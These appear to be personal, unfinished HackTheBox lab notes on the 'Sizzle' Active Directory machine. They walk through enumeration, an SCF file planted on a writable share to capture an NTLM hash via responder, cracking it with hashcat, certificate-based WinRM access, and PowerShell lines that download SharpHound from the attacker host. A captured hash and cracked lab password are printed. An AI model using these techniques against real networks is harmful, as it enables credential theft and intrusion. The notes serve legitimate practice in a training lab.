# Sizzle

Tags: AD-Win
Level: Insane
Tools: gobuster, ldapsearch, smbclient, mount, smbcacls, winrm HTTP 5985, HTTPS 5986, 
Status: In progress
Date: December 21, 2023

### Nmap

Today 21 Dec 2023 starting HackTheBox new machine Insane level Windows Active Directory.

```bash
nmap -sC -sV -A -oN Nmap_Sizzle 10.10.10.103
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-21 23:47 EST
Nmap scan report for 10.10.10.103
Host is up (0.051s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-12-22T04:49:10+00:00; -2s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2023-12-22T04:49:10+00:00; -2s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-12-22T04:49:10+00:00; -2s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-12-22T04:49:10+00:00; -2s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-12-22T04:49:10+00:00; -2s from scanner time.
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-12-22T04:48:32
|_  start_date: 2023-12-22T04:43:44
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -2s, deviation: 0s, median: -2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.81 seconds
```

### FTP Anonymous

Starting with 21 FTP port open with anonymous

No file in the directory, No permission create directory in FTP. **TRY with Some Credentials**

![Untitled](Sizzle%206f38bb53eab5448c9d452e52de3d0049/Untitled.png)

### DNS

>nslookup

>server 10.10.10.103

>127.0.0.1

>10.10.10.103

>HTB.LOCAL

>sizzle.htb.local

53 DNS port No Useful information with nslookup, dig

No use

![Untitled](Sizzle%206f38bb53eab5448c9d452e52de3d0049/Untitled%201.png)

### HTTP

80,443 - HTTP, HTTPS

- Are these the same? Yes
- Virtual host routing? No
- **Virtual Host Routing** refers to the practice of directing incoming network traffic to different backend servers or services based on the requested hostname. This is commonly used in web servers and application servers to serve multiple websites or services from a single IP address.

```markdown
>gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -k -u https://10.10.10.103/
>gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -k -u http://10.10.10.103
```

80 HTTP information is

ASP.NET, IIS 10.0, OPTIONS, TRACE, GET, HEAD, POST methods are allowed

![Untitled](Sizzle%206f38bb53eab5448c9d452e52de3d0049/Untitled%202.png)

### Certificate Authority (Sizzle-HTB-CA)

-Created July 3. 2018

### LDAP

In order to perform this operation we need **user authentication** 

```markdown
>ldapsearch -x -H ldap://10.10.10.103
>ldapsearch -x -H ldap://10.10.10.103 -s base namingcontexts
>ldapsearch -x -H ldap://10.10.10.103 -s base -b 'dc=HTB,dc=LOCAL'
>ldapsearch -x -H ldap://10.10.10.103 -s sub -b 'dc=HTB,dc=LOCAL'
>ldapsearch -x -H ldap://sizzle.htb.local -s sub -b 'dc=htb,dc=local'

## Forest machine commands
>ldapsearch -H ldap://10.10.10.161 -x -s base namingcontests
ldapsearch -H ldap://10.10.10.161 -x -b "dc=htb,dc=local"
ldapsearch -H ldap://10.10.10.161 -x -b dc=htb,dc=local
ldapsearch -H ldap://10.10.10.161 -x -b "dc=htb,dc=local" "(objectClass=person)"
ldapsearch -H ldap://10.10.10.161 -x -b "dc=htb,dc=local" "(objectClass=person)" | grep "sAMAccountName"
cat sAMAccountName | cut -d ":" -f 2 > users
```

### SMB

Good article related to SMB shares, Users folder has Public user folder has full control permission

[https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

```markdown
>smbmap -H 10.10.10.103
>smbmap -H 10.10.10.103 -u null -p null (NO information)
>smbclient -N -L //10.10.10.103 
>smbclient -N  //10.10.10.103/Operations (Access denied)
>smbclient -N  '//10.10.10.103/Department Shares' (Many files are their)
##Monted locally using below command
>sudo mount -t cifs '//10.10.10.103/Department Shares' /mnt
> cd /mnt
mnt>ls users
mnt>for i in $(ls); do echo $i; done (It will list one by one)
mnt>smbcacls -N '//10.10.10.103/Department Shares' /Users
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:Everyone:ALLOWED/0x0/READ
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL
#Output end
>for i in $(ls); do echo $i; smbcacls -N '//10.10.10.103/Department Shares' $i; done 
>xxd * | grep -v '0000 0000 0000 0000 0000 0000 0000 0000' (Make the for loop)
>└─$ smbcacls -N '//10.10.10.103/Department Shares' Users/Public
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:Everyone:ALLOWED/OI|CI/FULL
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL
#Output end
/Desktop/HTB/Sizzle>cat stealhash.scf 
[Shell]
Command=2
IconFile=\\10.10.14.29\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
#Other Terminal 
>sudo responder -I tun0 -v
>sudo cp stealhash.scf /mnt/Users/Public
# I got the Amanda Hash
amanda::HTB:e76240741c815a33:DD0161BDD949F0DB0ABE10458F1C83F6:0101000000000000004BA7251CD
6DA01E6145E63B0233F7A0000000002000800330050003800580001001E00570049004E002D00540042003900
58004F004B004B0057004B0059004A0004003400570049004E002D0054004200390058004F004B004B0057004
B0059004A002E0033005000380058002E004C004F00430041004C000300140033005000380058002E004C004F
00430041004C000500140033005000380058002E004C004F00430041004C0007000800004BA7251CD6DA01060
00400020000000800300030000000000000000100000000200000284F2DEAEECC4EE32887E1EA59C13A788070
88DEED1D29CDA34705EFEBB1B5D20A00100000000000000000000000000000000000090020006300690066007
3002F00310030002E00310030002E00310034002E0032003900000000000000000000000000
>hashcat -m 5600 amanda_ntlm.hash rockyou.txt (amanda/Ashare1972)
#SCF FIle on Users/Public -> NetNTKMv2 -> Cracked
>smbmap -u amanda -d htb.local -p 'Ashare1972' -H 10.10.10.103
#User is not admin not trying winexec tool
```

SMB below shares with smbclient, No information smbmap and ladsearch, enum4linux

![Untitled](Sizzle%206f38bb53eab5448c9d452e52de3d0049/Untitled%203.png)

### Enumeration

After SMB enumeration start here 

https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb

![Untitled](Sizzle%206f38bb53eab5448c9d452e52de3d0049/Untitled%204.png)

For ahentication of winrm uses

HTTP 5985, HTTPS 5986

![Untitled](Sizzle%206f38bb53eab5448c9d452e52de3d0049/Untitled%205.png)

This error, From IPPSEC video

**This authenticates the certificate, not the user**

![Untitled](Sizzle%206f38bb53eab5448c9d452e52de3d0049/Untitled%206.png)

Request a certificate > advanced certificate request. > Enter data in Base 64 ? (User) > Submit > download as Base64 format  (**certnew.cer**)

```markdown
#Generating a certificate
>openssl genrsa -aes256 -out amanda.key 2048 (amanda - password)
# Signing the certificate
>openssl req -new -key amanda.key -out amanda.csr(ENter passowrd given above, thenEnter and Enter for all options)
#Submit this amanda.csr text in the website ABove image states 
>
```

![Untitled](Sizzle%206f38bb53eab5448c9d452e52de3d0049/Untitled%207.png)

Changed code added certificate like above 

```markdown

>ldapsearch -x -H ldap://sizzle.htb.local -D 'amanda@htb.local' -w 'Ashare1972' -b 'dc=htb,dc=local' 
>ldapsearch -x -H ldap://sizzle.htb.local -D 'amanda@htb.local' -w 'Ashare1972' -b 'dc=htb,dc=local' "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=htb,DC=local))"
>ldapsearch -x -H ldap://sizzle.htb.local -D 'amanda@htb.local' -w 'Ashare1972' -b 'dc=htb,dc=local' "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=htb,DC=local))" |grep sAMAccountName
sAMAccountName: Administrator
sAMAccountName: sizzler
>rlwrap ruby winrm_shell.rb
# After waiting for some time got shell, enter certificate password.
>dir
>IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.29:8000/SharpHound.exe', 'SharpHound.exe')
#error
>IWR -Uri http://10.10.14.29:8000/SharpHound.exe -Outfile SharpHound.exe
>SharpHound.exe
#BLocked by group policy

```

### User flag

### Root flag